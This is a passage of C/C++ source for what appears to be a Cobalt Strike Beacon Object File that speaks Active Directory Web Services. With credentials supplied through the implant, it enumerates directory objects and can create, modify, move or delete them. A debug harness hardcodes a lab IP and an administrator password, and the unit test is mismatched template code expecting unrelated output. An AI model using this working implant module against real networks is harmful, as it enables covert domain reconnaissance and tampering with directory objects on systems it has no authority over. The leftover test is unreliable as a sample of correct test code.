		*obj = body ? parse_object_node(body, resp + adws_strlen(resp)) : AdwsObject{ 0 };
		adws_free(resp);
		return obj;
	}

	void adws_object_free(AdwsObject* obj) {
		if (!obj) return;
		free_object(obj);
		adws_free(obj);
	}

	/* ── Put ------── */

	int adws_put(AdwsClient* c, const char* dn,
		const char** attr_names, const char* const* const* attr_values,
		const int* attr_nvalues, const int* attr_ops, int n_attrs)
	{
		Buf attrs = buf_new();
		for (int i = 0;i < n_attrs;i++) {
			char* frag = build_mod_xml(attr_names[i],
				(const char**)attr_values[i], attr_nvalues[i],
				NULL, NULL, 0, attr_ops[i]);
			if (!frag) { buf_free(&attrs); return FALSE; }
			buf_append_str(&attrs, frag); adws_free(frag);
		}
		buf_push(&attrs, 0);

		char uuid[37]; generate_uuid(uuid);
		Buf dn_esc = buf_new(); xml_escape_str(&dn_esc, dn, adws_strlen(dn)); buf_push(&dn_esc, 0);

		const char* kvs[] = { "uuid",uuid,"fqdn",c->fqdn,"dn",(char*)dn_esc.data,"attributes",(char*)attrs.data };
		char* xml = tpl_fill(kPutTpl, kvs, 8);
		buf_free(&dn_esc); buf_free(&attrs);
		if (!xml) return FALSE;

		int ok = adws_send_request(c, xml); adws_free(xml);
		if (!ok) return FALSE;

		char* resp = adws_recv_response(c);
		if (!resp) return FALSE;

		AdwsError err; adws_memset(&err, 0, sizeof(err));
		ok = check_soap_fault(resp, &err);
		adws_free(resp); adws_free(err.code); adws_free(err.reason);
		return ok;
	}

	/* ── Delete ---───────────────────────────── */

	int adws_delete(AdwsClient* c, const char* dn) {
		char uuid[37]; generate_uuid(uuid);
		Buf dn_esc = buf_new(); xml_escape_str(&dn_esc, dn, adws_strlen(dn)); buf_push(&dn_esc, 0);
		const char* kvs[] = { "uuid",uuid,"fqdn",c->fqdn,"dn",(char*)dn_esc.data };
		char* xml = tpl_fill(kDeleteTpl, kvs, 6);
		buf_free(&dn_esc);
		if (!xml) return FALSE;
		int ok = adws_send_request(c, xml); adws_free(xml);
		if (!ok) return FALSE;
		char* resp = adws_recv_response(c);
		if (!resp) return FALSE;
		AdwsError err; adws_memset(&err, 0, sizeof(err));
		ok = check_soap_fault(resp, &err);
		adws_free(resp); adws_free(err.code); adws_free(err.reason);
		return ok;
	}

	/* ── Create ---───────────────────────────── */

	int adws_create(AdwsClient* c, const char* dn, const char* object_class,
		const char** attr_names, const char* const* const* attr_values,
		const int* attr_nvalues, int n_attrs)
	{
		Buf attrs = buf_new();
		for (int i = 0;i < n_attrs;i++) {
			char* frag = build_mod_xml(attr_names[i],
				(const char**)attr_values[i], attr_nvalues[i],
				NULL, NULL, 0, 0);
			if (!frag) { buf_free(&attrs); return FALSE; }
			buf_append_str(&attrs, frag); adws_free(frag);
		}
		buf_push(&attrs, 0);

		char uuid[37]; generate_uuid(uuid);
		Buf dn_esc = buf_new(); xml_escape_str(&dn_esc, dn, adws_strlen(dn)); buf_push(&dn_esc, 0);
		Buf oc_esc = buf_new(); xml_escape_str(&oc_esc, object_class, adws_strlen(object_class)); buf_push(&oc_esc, 0);

		const char* kvs[] = { "uuid",uuid,"fqdn",c->fqdn,"dn",(char*)dn_esc.data,
							 "object_class",(char*)oc_esc.data,"attributes",(char*)attrs.data };
		char* xml = tpl_fill(kCreateTpl, kvs, 10);
		buf_free(&dn_esc); buf_free(&oc_esc); buf_free(&attrs);
		if (!xml) return FALSE;
		int ok = adws_send_request(c, xml); adws_free(xml);
		if (!ok) return FALSE;
		char* resp = adws_recv_response(c);
		if (!resp) return FALSE;
		AdwsError err; adws_memset(&err, 0, sizeof(err));
		ok = check_soap_fault(resp, &err);
		adws_free(resp); adws_free(err.code); adws_free(err.reason);
		return ok;
	}

	/* ── Move ------─ */

	int adws_move(AdwsClient* c, const char* dn, const char* new_dn) {
		char uuid[37]; generate_uuid(uuid);
		Buf dn_esc = buf_new(); xml_escape_str(&dn_esc, dn, adws_strlen(dn)); buf_push(&dn_esc, 0);
		Buf nd_esc = buf_new(); xml_escape_str(&nd_esc, new_dn, adws_strlen(new_dn)); buf_push(&nd_esc, 0);
		const char* kvs[] = { "uuid",uuid,"fqdn",c->fqdn,"current_dn",(char*)dn_esc.data,"new_dn",(char*)nd_esc.data };
		char* xml = tpl_fill(kMoveTpl, kvs, 8);
		buf_free(&dn_esc); buf_free(&nd_esc);
		if (!xml) return FALSE;
		int ok = adws_send_request(c, xml); adws_free(xml);
		if (!ok) return FALSE;
		char* resp = adws_recv_response(c);
		if (!resp) return FALSE;
		AdwsError err; adws_memset(&err, 0, sizeof(err));
		ok = check_soap_fault(resp, &err);
		adws_free(resp); adws_free(err.code); adws_free(err.reason);
		return ok;
	}

	/* ─── GUID / SID parsing (matching BridgeHead reference) ─────────────────── */

	int adws_parse_guid(const u8* bytes, char out[39]) {
		if (!bytes) return FALSE;
		u32 d1 = (u32)bytes[0] | (u32)bytes[1] << 8 | (u32)bytes[2] << 16 | (u32)bytes[3] << 24;
		u16 d2 = (u16)bytes[4] | (u16)bytes[5] << 8;
		u16 d3 = (u16)bytes[6] | (u16)bytes[7] << 8;
		out[0] = '{';
		u64_to_hex(d1, out + 1, 8); out[9] = '-';
		u64_to_hex(d2, out + 10, 4); out[14] = '-';
		u64_to_hex(d3, out + 15, 4); out[19] = '-';
		u64_to_hex(((u64)bytes[8] << 8) | bytes[9], out + 20, 4); out[24] = '-';
		u64_to_hex(((u64)bytes[10] << 40) | ((u64)bytes[11] << 32) | ((u64)bytes[12] << 24) |
			((u64)bytes[13] << 16) | ((u64)bytes[14] << 8) | bytes[15], out + 25, 12);
		out[37] = '}'; out[38] = 0;
		return TRUE;
	}

	/* Returns heap-allocated SID string "S-R-A-SA..." */
	char* adws_parse_sid(const u8* bytes, size_t len) {
		if (len < 8) return NULL;
		u8 revision = bytes[0], sub_count = bytes[1];
		u64 authority = 0;
		for (int i = 0;i < 6;i++) authority = (authority << 8) | bytes[2 + i];
		if (len < 8u + (size_t)sub_count * 4u) return NULL;

		Buf b = buf_new();
		buf_append_str(&b, "S-");
		char tmp[24];
		int n = u32_to_str(revision, tmp, sizeof(tmp)); buf_append(&b, (u8*)tmp, (size_t)n); buf_push(&b, '-');
		n = u32_to_str((u32)authority, tmp, sizeof(tmp)); buf_append(&b, (u8*)tmp, (size_t)n);
		for (u8 i = 0;i < sub_count;i++) {
			size_t off = 8 + (size_t)i * 4;
			u32 sub = (u32)bytes[off] | (u32)bytes[off + 1] << 8 | (u32)bytes[off + 2] << 16 | (u32)bytes[off + 3] << 24;
			buf_push(&b, '-');
			n = u32_to_str(sub, tmp, sizeof(tmp)); buf_append(&b, (u8*)tmp, (size_t)n);
		}
		buf_push(&b, 0);
		return (char*)b.data;
	}




	void adws_cleanup(void) {
		if (pfn_WSACleanup) pfn_WSACleanup();
	}

	/* ─── Optional: simple print helper (uses WriteFile via kernel32) ────────── */



	void go(char* args, int len) {

		datap parser;

		BeaconDataParse(&parser, args, len);

		char* ip = BeaconDataExtract(&parser, NULL);
		char* domain = BeaconDataExtract(&parser, NULL);
		char* user = BeaconDataExtract(&parser, NULL);
		char* pass = BeaconDataExtract(&parser, NULL);
		char* query = BeaconDataExtract(&parser, NULL);
		char* attrs_str = BeaconDataExtract(&parser, NULL);

		char* attr_ptrs[64];
		int   attr_count = 0;

		if (attrs_str && *attrs_str) {
			char* p = attrs_str;
			attr_ptrs[attr_count++] = p;
			while (*p && attr_count < 64) {
				if (*p == ',') {
					*p = '\0';
					p++;
					while (*p == ' ') p++;
					if (*p) attr_ptrs[attr_count++] = p;
				}
				else {
					p++;
				}
			}
		}
		attr_ptrs[attr_count] = NULL;

		const char** attrs = (attr_count > 0) ? (const char**)attr_ptrs : NULL;

		AdwsClient* c = adws_connect(ip, ip, domain, user, pass, "Enumeration", 120000);
		if (!c) { return; }

		AdwsResult result;
		adws_memset(&result, 0, sizeof(result));
		adws_enumerate(c, query, attrs, "DC=lab,DC=local", collect_callback, &result, 100000);

		for (size_t i = 0; i < result.count; i++) {
			AdwsObject* obj = &result.objects[i];
			Buf out = buf_new();

			/* Object header */
			{
				char tmp[32];
				buf_append_str(&out, "[*] Object ");
				u32_to_str((u32)(i + 1), tmp, sizeof(tmp));
				buf_append_str(&out, tmp);
				buf_append_str(&out, "\n");
			}

			for (size_t j = 0; j < obj->attr_count; j++) {
				AdwsAttr* attr = &obj->attrs[j];
				if (adws_strcmp(attr->name, "user") == 0) continue;
				if (adws_strcmp(attr->name, "computer") == 0) continue;
				if (adws_strcmp(attr->name, "objectReferenceProperty") == 0) continue;
				if (adws_strcmp(attr->name, "value") == 0) continue;
				if (attr->value_count == 0) continue;

				for (size_t k = 0; k < attr->value_count; k++) {
					const char* val = attr->values[k] ? attr->values[k] : "(null)";

					/* pad attribute name to 30 chars */
					size_t nlen = adws_strlen(attr->name);
					buf_append_str(&out, "  ");
					buf_append_str(&out, attr->name);
					for (size_t p = nlen; p < 30; p++) buf_push(&out, ' ');
					buf_append_str(&out, ": ");

					if (adws_strcmp(attr->name, "objectSid") == 0) {
						Buf decoded = buf_new();
						base64_decode(&decoded, val, adws_strlen(val));
						char* sid_str = adws_parse_sid(decoded.data, decoded.len);
						buf_free(&decoded);
						if (sid_str) {
							buf_append_str(&out, sid_str);
							adws_free(sid_str);
						}
						else {
							buf_append_str(&out, val);
						}
					}
					else if (adws_strcmp(attr->name, "objectGUID") == 0) {
						Buf decoded = buf_new();
						base64_decode(&decoded, val, adws_strlen(val));
						if (decoded.len == 16) {
							char guid_str[39];
							adws_parse_guid(decoded.data, guid_str);
							buf_append_str(&out, guid_str);
						}
						else {
							buf_append_str(&out, val);
						}
						buf_free(&decoded);
					}
					else {
						buf_append_str(&out, val);
					}

					buf_append_str(&out, "\n");
				}
			}

			buf_push(&out, 0); /* NUL terminate */
			BeaconPrintf(CALLBACK_OUTPUT, "%s", (char*)out.data);
			buf_free(&out);
		}
		adws_close(c);
	}
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
	// Run BOF's entrypoint
	// To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
	//bof::runMocked<>(go);
	bof::runMocked<const char*, const char*, const char*, const char*>(go, "192.168.1.100", "lab.local", "administrator", "password");
	/* To test a sleepmask BOF, the following mockup executors can be used
	// Mock up Beacon and run the sleep mask once
	bof::runMockedSleepMask(sleep_mask);

	// Mock up Beacon with the specific .stage C2 profile
	bof::runMockedSleepMask(sleep_mask,
		{
			.allocator = bof::profile::Allocator::VirtualAlloc,
			.obfuscate = bof::profile::Obfuscate::False,
			.useRWX = bof::profile::UseRWX::True,
			.module = "",
		},
		{
			.sleepTimeMs = 5000,
			.runForever = false,
		}
	);
	*/

	return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
	std::vector<bof::output::OutputEntry> got =
		bof::runMocked<>(go);
	std::vector<bof::output::OutputEntry> expected = {
		{CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
	};
	// It is possible to compare the OutputEntry vectors, like directly
	// ASSERT_EQ(expected, got);
	// However, in this case, we want to compare the output, ignoring the case.
	ASSERT_EQ(expected.size(), got.size());
	ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif